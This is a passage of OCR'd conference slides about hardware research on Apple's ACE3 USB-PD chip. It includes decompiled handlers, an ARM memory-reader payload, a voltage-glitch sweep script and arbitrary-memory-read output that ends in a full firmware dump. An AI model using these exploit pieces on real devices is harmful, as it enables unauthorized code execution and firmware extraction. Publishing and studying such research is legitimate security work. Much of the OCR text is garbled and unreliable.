e0046f88 data_2685671e = 6
@0046f8a Flash uint32_t r6_18 = zx.d(*r6)
60046F8c data_208424f1 = r@_18.b
60046f8e sub_40e14(r@_18, ‘USBw', @, @x2@95671e)
60840f48 else
60040f48 if (data_26@4605c_CURRENT_MODE_2 == ‘USBw')
@0048T48 goto label_49f84
60040f4e if (data_2004005c_CURRENT_MODE_2 == 'CFUp')
@8046F52 *(var_18 + @x19) =
68046f58 if (var_20 == 7)
@0046f5e var_26 = @x183
60046F62 sub_35d22 (&var_2@)
@ hextree.io
```

## Slide 207

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
20486818 int32_t r7 = 6
2048681c if (probably_current_mode_1 == ‘DISC')
264868f6 label_204668f8:
204068f8 r7 = 3
20406822 else
20406822 if (probably_current_mode_1 == 'UFPf')
20466822 goto label_264068f0
20406828 if (probably_current_mode_1 == 'DFUf‘)
20496828 goto label _264068f6
20406832 if (zx.d(data_206430b9) == @)
20406832 goto label_2e4¢68f8
2040683a if (sub_204091@c() == @)
20406B3a goto label_264968f@
20406858 if (zx.d(**(arg2 + 8)) u>> 7 == 6 || (zx.d(**(arg2 + 8)
2640685a uint32_t r3_5 = zx.d(*r5)
26486862 if (r3_5 << @x1f != 9)
20496866 int32_t probably_current_mode_2 = probably_curr
2040686a if (probably_current_mode_2 == 'USBw')
resocae4N © E2 goto label 204968f¢0
2040687405 if (probably_current_mode_2 == 'CFUp')
cowed Irmware data_20043@c9 = @
2048687a data_26846bde = 8
2048687e data_20046bdd = 8
20466886 if (zx.d(data_26042ch2) u>> 4 == @xf)
204068a@ int32_t var_18_1 = 8x183
204868ca __builtin_strnepy(dest: &probably_current_mode,
204868ce data_200429d9 = *r§
204068d8 int32_t var_1c_1 = @x8684
20486Be8 else if (zx.d(data_20@42cb2) u>> 4 == @xe)
204068f6 data_206429d9 = r3_5.b
204068fa data_20046bdd = 1
204068ee else
284868ee if (probably_current_mode != ‘USBw')
204068ee goto label_294068f@
88048eee
60040ef2
e0046f84
80046f84
00040ef8
@004Gef8
80048ef8
6804Gefe
e0040efe
e8848Tb2
60048f68
e0046f88
60046f10
60046T10
60046F28
60040f40
6G048T42
60040f82
86849T82
60046f88
@0046f8a
60G46f8c
60046f8e
00046f48
60040f48
86046T48
60040f4e
68048752
68046f58
@0046f5e
60046f62
80040768
00040f6c
e0040f6e
int32_t r5 = @
if (data_2@64065c_CURRENT_MODE_1 == ‘DISC')
label_46f84:
rs6=3
else
if (data_2@@4605c_CURRENT_MODE_1 == ‘UFPf')
goto label _4ef84
if (data_2004005c_CURRENT_MODE_1 == ‘DFUf’)
goto label_40f84
var_18 = &data_26842988
if (zx.d(data_20842991) == @)
goto
label_49f84
if (sub_44cc8() == @)
goto
label_49f84
if (zx.d(**(arg2 + 4)) u>> 7 == @ || (zx.d(**(arg2 + 4)) u>> 7 !=@ 8
ACE3
Flash
int3
if (
else
2_t data_2064@@5c_CURRENT_MODE_2 = data_2004065c_CURRENT_MODE
zx.d(*r6) << @xif == 8)
if (data_26@4605c_CURRENT_MODE_2 != 'USBw')
goto label_46f84
data_2085671e = 6
uint32_t r@_18 = zx.d(*r6)
data_298424f1 = r@_18.b
sub_48e14(r@_18, ‘USBw', @, @x2@95671e)
if (data_2664@@5c_CURRENT_MODE_2 == ‘USBw')
goto label_49f84
if (data_2004005c_CURRENT_MODE_2 == 'CFUp')
*(var_18 + 6x19) = 86
if (var_20 == 7)
var_26 = @x183
sub_35d22 (&var_20)
_-builtin_strnepy(dest: &data_2@040@5c_CURRENT_MODE, src: “US
data_200424f1 = *r6
sub_4@c6c()
@ hextree.io
```

## Slide 208

##### USBw Command Handler

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
20406818 int32_t r7 = 0 ; @e048eee int32_t r5 = @
2040681¢ = if (probably_current_mode_1 == ‘DISC') | @0040ef2 if (data_2@¢4005c_CURRENT_MODE_1 == 'DISC')
204068f0 label_204068f0: 8004084 label_46f84:
204068f@ r7 = 3 60048384 rh =3
20406822 else 00040ef8 else
20406822 if (probably_current_mode_1 == ‘UFPf') 60048ef8 if (data_2@04@@05c_CURRENT_MODE_1 == ‘UFPTf')
20406822 goto label_2e4068f@ e0040ef8 goto label_40f84
20406828 if (probably_current_mode_1 == 'DFUf') 6804Gefe if (data_2004005c_CURRENT_MODE_1 == ‘DFUf’)
20496828 goto label_264068f6 0004Gefe goto label_49f84
20406832 if (zx.d(data_260430b9) == 9) 88846782 var_18 = &data_26B842988
20406832 goto label_2e4968f0 60046f68 if (zx.d(data_20842991) == @)
2040683a if (sub_2040910c() == 0) g0046F88 goto label_4af84
ananeoon mata Tahal on«anecoton aanaafia §# feu AAnwaAQl!\ == AL
4£08su000/a uala_zu0usoUuUuUTC =- 9 vuut7d! ou uulta_zuotfeti i = 19ULI10.U
2048687e data_20046bdd = 8 60046f8e sub_48e14(r@_18, ‘USBw', @, @x2@95671e)
20486886 if (zx.d(data_26842ch2) u>> 4 == @xf) 80040f48 else
204068a@ int32_t var_1B_1 = 8x183 60040f48 if (data_2664605c_CURRENT_MODE_2 == ‘USBw')
204068ca __builtin_strnepy(dest: &probably_current_mode, @@048f48 goto label_49f84
204868ce data_200429d9 = *r§ 60040f4e if (data_2004005c_CURRENT_MODE_2 == 'CFUp')
204068d8 int32_t var_ic_1 = 6x8684 88048F52 *(var_18 + 6x19) = 86
204068e8 else if (zx.d(data_20@42cb2) u>> 4 == @xe) 68046f58 if (var_20 == 7)
204068f6 data_206429d9 = r3_5.b e004ef5e var_28 = @x183
204068fa data_20046bdd = 1 6e046f62 sub_35d22 (&var_20)
204068ee else eee4ef68 = __buil tin_strnepy(dest: &data_20%
204868ee if (probably_current_mode != ‘USBw') G0040F6c data_200424f1 = *r6
204068ee goto label_294868f@ 60046T6e sub_4@c6c()
@ hextree.io
```

## Slide 209

###### Payload

```
push    {r4, r5, r6, lr}
ldr r4, [r1, #4]
ldr r0, [r4]
ldr     r0, [r0]
str     r0, [r4]
movs r0, #0xFF
pop     {r4, r5, r6, pc}
```

Trivial memory reader Takes in address Returns bytes at address

**hextree** .io

## Slide 210

###### Attempt  2: Replaced USBw Command

**hextree** .io

## Slide 211

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
center = 44793408
pulse = 20
success = False
while not success:
for delay in trange(center - 1000, center + 1000):
setup_husky(delay, pulse)
result = test_ace()
print(f'"{result} {delay} {pulse}")
if result == "APP":
print(f"Success: {delay}")
success = True
break
Python
Python
xtree.io
```

## Slide 212

###### `$ sudo ./acetool USBw 00000000`

**hextree** .io

## Slide 213

```
$ sudo ./acetool USBw 00000000
Status: APP
Running command: USBw - Data: 4
Executing command
Result is: 00 00 06 20
Status: APP
```

**hextree** .io

## Slide 214

```
$ sudo ./acetool USBw 00000000
Status: APP
Running command: USBw - Data: 4
Executing command
Result is: 00 00 06 20
Status: APP
```

**hextree** .io

## Slide 215

```
$ sudo ./acetool USBw 00000000
Status: APP
Running command: USBw - Data: 4
Executing command
Result is: 00 00 06 20 20 06 00 00
Status: APP
```

**hextree** .io

## Slide 216

```
$ sudo ./acetool USBw 00000000
Status: APP
Running command: USBw - Data: 4
Executing command
Result is: 00 00 06 20 20 06 00 00Stack pointer reset value
Status: APP
```

**hextree** .io

## Slide 217

`$ sudo ./acetool USBw 00000000 Status: APP Running command: USBw - Data: 4 Executing command Result is: 00 00 06 20 20 06 00 00 Stack pointer reset value Status: APP` We can read (and write) arbitrary memory!

**hextree** .io

## Slide 218

###### Time to dump

**hextree** .io

## Slide 219

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
b'Mac type: J514sAP\nLooking for HPM devices...\nFound: I0Service: /AppleARMPE/arm—io@10F00000/AppleH1510/nub-spmi-a1@54A08000/AppleGen3SPMIController/hpm2@8/AppleHPMARMSPMI\nConnection: None\nSt
atus: APP \nAdding char: 5@ to @@@0@@06\nAdding char: 73 to @@000001\nAdding char: 62 to 00@0000@2\nAdding char: 0@ to 9860@@03\nRunning command: USBw - Data: 4\nExecuting command\nBRes is: 4@ 6B
@x27354
b'Mac type: J514sAP\nLooking for HPM devices...\nFound: I0Service: /AppleARMPE/arm—i0010F00000/AppleH1510/nub-spmi-a1@54A08880/AppleGen3SPMIController/hpm2@8/AppleHPMARMSPMI\nConnection: None\nSt
atus: APP \nAdding char: 54 to @8@0@000\nAdding char: 73 to 8@000001\nAdding char: 62 to 60000082\nAdding char: 88 to 00808803\nRuNning command: USBw - Data: 4\nExecuting command\nBRes is: 04 D1
@x27358
b'Mac type: J514sAP\nLooking for HPM devices...\nFound: I0Service: /AppleARMPE/arm—i0@10F0@0000/AppleH1510/nub-spmi-a1@54A08000/AppleGen3SPMIController/hpm2@8/AppleHPMARMSPMI\nConnection: None\nSt
atus: APP \nAdding char: 58 to @@@0@@00\nAdding char: 73 to @@0@0601\nAdding char: 62 to @@6060802\nAdding char: @@ to @660@0@3\nRunning command: USBw - Data: 4\nExecuting command\nBRes is: @1 20
@x2735c
b'Mac type: J514sAP\nLooking for HPM devices...\nFound: I0Service: /AppleARMPE/arm—i0018F00000/AppleH1510/nub-spmi-a1@54A08880/AppleGen3SPMIController/hpm2@8/AppleHPMARMSPMI \nConnection: None\nSt
atus: APP \nAdding char: 5C to @8@0000@\nAdding char: 73 to @@000001\nAdding char: 02 to 90900002\nAdding char: 08 to 90000803\nRunning command: USBw - Data: 4\nExecuting command\nBRes is: 58 31
@x27368
b'Mac type: J514sAP\nLooking for HPM devices...\nFound: I0Service: /AppleARMPE/arm—i0010F@0000/AppleH1510/nub-spmi-a1@54A68000/AppleGen3SPMIController/hpm2@8/AppleHPMARMSPMI\nConnection: None\nSt
atus: APP \nAdding char: 6@ to @@@0@@06\nAdding char: 73 ta @0000001\nAdding char: 62 to @@060002\nAdding char: 0@ to @860@@03\nRunning command: USBw - Data: 4\nExecuting command\nBRes is: @E F@
@x27364
b'Mac type: J514sAP\nLooking for HPM devices...\nFound: I0Service: /AppleARMPE/arm—i0018F00000/AppleH1510/nub-—spmi-a1@54A08880/ App leGen3SPMIController/hpm2@8/AppleHPMARMSPMI \nConnection: None\nSt
atus: APP \nAdding char: 64 to @0@00000\nAdding char: 73 to @@000001\nAdding char: 62 to 000000@2\nAdding char: 08 to 000000@3\nRunning command: USBw - Data: 4\nExecuting command\nBRes is: 10 BD
@x27368
b'Mac type: J514sAP\nLooking for HPM devices...\nFound: IO0Service:/AppleARMPE/arm—i0010F@0006/App1eH1510/nub-spmi-a1@54A68000/AppleGen3SPMIController/hpm2@8/AppleHPMARMSPMI\nConnection: Nane\nSt
atus: APP \nAdding char: 68 to @8@0000@\nAdding char: 73 to @0000001\nAdding char: 62 to @0000002\nAdding char: 0@ to @0000803\nRunning command: USBw - Data: 4\nExecuting command\nBRes is: DA F7
@x2736c
b'Mac type: J514sAP\nLooking for HPM devices...\nFound: I0Service: /AppleARMPE/arm—io@18F00000/App1leH1510/nub-spmi-a1@54A08080/AppleGen3SPMIController/hpm2@8/AppleHPMARMSPMI\nConnection: None\nSt
atus: APP \nAdding char: 6C to @0@00000\nAdding char: 73 to @0000001\nAdding char: 62 to 00000002\nAdding char: 08 to 980088@3\nRunning command: USBw - Data: 4\nExecuting command\nBRes is: AB 48
```

## Slide 220

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
<> hteantdtinis +)
image_combined.bin.bndb — Binary Ninja 4.0.4958-Stable
%
|
9
g
r
%
de
%
P|
Types Q Search types
~ User Types: image_combined.bin.bndb
© command_handler
System Types: image_combined.bin....
Platform: thumb2
struct command_handler __packed
{
ee8 char command[@x4];
04 int32_t (* handler) (int32_t cmd,
int32_t* args);
e8 };
Cross References
» Filter (191)
> Data References
| @@eee0e8 void*
| 9000018 void*
| 0000014 void*
| 9000018 void*
| @@00@01c void*
| 0000028 void*
| 0000024 void*
|€ 0000028 void*
|© 0000038 void*
| 0000034 void*
data_8
data_16
data_14
data_18
data_ic
data_26
data_24
data_28
data_36
data_34
{18}
Ln }
Mapped ~ Linear» High Level IL ~ En
Architecture: thumb2
Segments:
r-x 6x88000000-6x00858008
--- 6x66058066-6x66658014
rwx 6x20648000-6x20858008
Sections:
@x00058000-6x00058014 .synthetic_builtins {External}
@x208409a8-6x200421e8 pointer-list {Code}
68008004
eee08008
9800808c
98008016
98008014
00000018
8808881c
98008026
08000024
08008028
0800862c
90000036
98008034
98008038
0800803c
98008046
98000044
98000048
0800804c
8088056
90000054
98008054
98008054
90000054
98008054
void*
void*
void*
void*
void*
void*
void*
void*
void*
void*
void*
void*
void*
void*
void*
void*
void*
void*
void*
void*
wehar16 data_54[@x3f] = "\xd1\x8b\x@3\xd@\xbf\x83\xd@\xb3\x@3\xfb\x93\x83\xc8\x9d\x@3\xfb\xb1\x83\xfd\x91"
"\x@3\xfe\xa5\x@3\xca\x89\x83\xca\x81 \x83\xf5\xab\x63\xf5\xal \x83\xee\x89\x83\xf5\xb5\x83\xf8\xa9\x83"
"\xf8\x99\x83\xc4\xb7\x@3\xc2\x81\x83\xfa\xab\x63\xcb\xb7\x@3\xcc\xaf\x83\xfe\xb1\x83\xff\x95\x83"
"\xed\x8d\x@3\xcc\x8f\x83\xcc\xa5\x83 \xcd\x83\x63\xe8\x83\xda\x85\xc@\xb7\xfd\x84\xe@\x80\xdc\x88"
"\xff\xbd\x81", @
data_34 = nullptr
data_38 = sub_34c08
data_3c = sub_35f@e
data_48 = sub_35c28
data_44 = sub_36d78
data_48 = sub_35d38
data_4c = sub_36612
data_5@ = sub_34338
00011088
00011088
00011016
0001101a
int32_t sub_c8()
sub_10c86()
*6x40050064 = 2
sub_35d7e(@x40094124, *@x49894124 | 8)
sub_633a()
data_4 = stack_init
data_8 = nullptr
data_c = sub_f4
data_1@ = nullptr
data_14 = nullptr
data_18 = nullptr
data_ic = nullptr
data_2@ = nullptr
data_24 = nullptr
data_28 = nullptr
data_2c = endless_loop
data_3@ = nullptr
&
@30 &25 thumb2  0x0-0x4 (0x4 bytes)
hextree.io
```

## Slide 221

😎 Full dump of the ACE3 ROM & RAM!

**hextree** .io

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
te Types
Name
{tT} » User Types: image_combined.bin.bndb
command_handler
System Types: image_combined.bin....
Platform: thumb2
Q Search types
* Size
@x8
© image_combined.bin.bndb — Binary Ninja 4.0.4958-Stable
Mapped > Linear High Level IL ~
6x8
Architecture: thumb2
Segments :
r-x 6x88000000-6x00858008
--- @x@0058000-6x60058014
rwx 6x20046000-6x20858000
Sections:
@x@0858000-6x80058014 .synthetic_builtins {External}
@x200409a8-6x200421e8 pointer-list {Code}
08008000
68600084
void data_e = ex2e060008
void* data_4 = stack_init
© ill
Full dump of the ACE3 ROM & RAM!
Cross References
> Filter
(191)
~ Data References
le
le
le
le
le
le
le
le
le
le
90808008
0000016
90000014
0000018
880881c
90000628
0000824
1888628
60000836
00000834
void*
void*
void*
void*
void*
void*
void*
void*
void*
void*
data_8
data_16
data_14
data_18
data_ic
data_26
data_24
data_28
data_36
data_34
{10} &
la)
60000044 void* data_44 = sub_36d78
66000848 void* data_48 = sub_35d38
@800004c void* data_4c = sub_36612
60000058 void* data_5@ = sub_34338
00000054 weharl6 data_54[@x3f] = "\xd1\x8b\x@3\xd@\xbf\x@3\xd@\xb3\x03\xfb\x93\x03\xc8\x9d\x03\xfb\xb1\x@3\xfd\x91"
66600054 "\x@3\xfe\xa5\x@3\xca\x89\x83\xca\x81 \x83\xf5\xab\x63\xf5\xal \x83\xee\x89\x83\xf5\xb5\x83\xf8\xa9\x83"
08000054 "\xf8\x99\x83\xc4\xb7\x@3\xc2\x81\x83\xfa\xab\x63\xcb\xb7\x@3\xcc\xaf\x83\xfe\xb1\x83\xff\x95\x83"
0000054 "\xed\x8d\x@3\xcc\x8f\x@3\xcc\xa5\x@3\xcd\x83\x@3\xe8\x83\xda\x85\xc@\xb7\xfd\x84\xe@\x88\xdc\x86"
00008854 "\xff\xbd\x81", @
908008c8 int32_t sub_c8()
00011008 sub_10c86()
00011608 *0x40050064 = 2
00011616 sub_35d7e(@x40094124, *@x40094124 | 8)
0001101a sub_633a()
2003303 aye Peray
@30 A2s thumb2
yy Sees
0x0-0x4 (0x4 bytes) 8
& hextree.io
```

## Slide 222

###### Dumping unknown silicon is possible

And it's not super difficult We can get code-execution without having the firmware We can now start researching the ACE3!

**hextree** .io

## Slide 223

#### Thank you!

**hextree** .io
